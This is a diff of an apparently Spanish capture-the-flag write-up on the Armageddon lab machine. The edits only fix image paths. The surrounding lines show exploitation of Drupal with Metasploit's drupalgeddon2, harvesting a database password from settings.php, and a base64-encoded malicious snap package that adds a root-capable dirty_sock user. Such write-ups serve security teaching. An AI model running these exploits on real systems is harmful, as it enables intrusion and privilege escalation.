@@ -8,7 +8,7 @@ image: /assets/img/Anexos/IMG_0439.png
 comments: true
 ---
 
-![](Pasted%20image%2020250318104150-1.png)
+![](/assets/img/Anexos/Pasted%20image%2020250318104150-1.png)
 
 ## Reconocimiento
 Empiezo el reconocimiento con un escaneo de `nmap` bastante completo: 
@@ -43,7 +43,7 @@ El escaneo me reporta el puerto _22_ y el puerto _80_ abiertos. En el puertos _8
 
 En la web tenemos este login:
 
-![](Pasted%20image%2020250318104332-1.png)
+![](/assets/img/Anexos/Pasted%20image%2020250318104332-1.png)
 
 Usando `whatweb` nos reporta que estamos ante un drupal:
 ```shell
@@ -95,7 +95,7 @@ http://10.10.10.233/ [200 OK] Apache[2.4.6], Content-Language[en], Country[RESER
 ```
 `drupwn` nos reporta la versión de Drupal, por ello busco en `searchsploit` y me encuentro con una vulnerabilidad por versiones debajo de la _8.6.9_ que permite RCE usando `metaesploit`:
 
-![](Pasted%20image%2020250318150827-1.png|756)
+![](/assets/img/Anexos/%20image%2020250318150827-1.png|756)
 
 Por ello, ejecuto `metaesploit` y la busco con `search`:
 ```
@@ -134,9 +134,9 @@ Matching Modules
    25  exploit/unix/webapp/php_xmlrpc_eval                               2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution
 ```
 Es la número 2, la selecciono con `use` y establezco los parámetros:
-![](Pasted%20image%2020250318150921-1.png)
+![](/assets/img/Anexos/Pasted%20image%2020250318150921-1.png)
 
-![](Pasted%20image%2020250318151055-1.png)
+![](/assets/img/Anexos/Pasted%20image%2020250318151055-1.png)
 Ejecuto y logro una sesión de meterpreter, para estar más cómodo ejecuto `shell` para que me de una shell:
 ```shell
 msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run
@@ -184,7 +184,7 @@ brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
 ```
 
 Investigando un poco, en _/var/www/html/sites/default_ encontré un _settings.php_ que contiene la contraseña de mysql:
-![](Pasted%20image%2020250318151902-1.png)
+![](/assets/img/Anexos/Pasted%20image%2020250318151902-1.png)
 
 ```shell
     array (
@@ -368,7 +368,7 @@ Last login: Fri Mar 19 08:01:19 2021 from 10.10.14.5
 [brucetherealadmin@armageddon ~]$ 
 ```
 Una vez dentro como el usuario **brucetherealadmin** vemos que estamos en el grupo sudoers y que podemos ejecutar como root y sin autenticarnos el siguiente.
-![](Pasted%20image%2020250318160435-1.png)
+![](/assets/img/Anexos/Pasted%20image%2020250318160435-1.png)
 
 
 Para la escalada busqué en GTFObins pero no lo comprendía bien. Por ello me base en este git , solo en la parte en la que crea el paquete malicioso:
@@ -382,12 +382,12 @@ python -c 'print("aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAA
 
 Ahora, en el mismo directorio donde esta el paquete, usamos `snap` para instalarlo indicándole las etiquetas `--dangerous` y `--devmode`:
 
-![](Pasted%20image%2020250319091407-1.png)
+![](/assets/img/Anexos/Pasted image 20250319091407-1.png)
 Cuando este instalado, lo que habrá hecho es crear un usuario llamado **dirty_sock** con contraseña **dirty_sock** que esta en sudores y puede ejecutar TODO como cualquier usuario sin contraseña:
-![](Pasted%20image%2020250319091424-1.png)
+![](/assets/img/Anexos/Pasted%20image%2020250319091424-1.png)
 
-![](Pasted%20image%2020250319091514-1.png)
+![](/assets/img/Anexos/Pasted%20image%2020250319091514-1.png)
 
 Por ello, simplemente me cambio a **root** y ni siquiera es necesario proporcionar contraseña:
-![](Pasted%20image%2020250319091557-1.png)
+![](/assets/img/Anexos/Pasted%20image%2020250319091557-1.png)
 Y somos root!. 
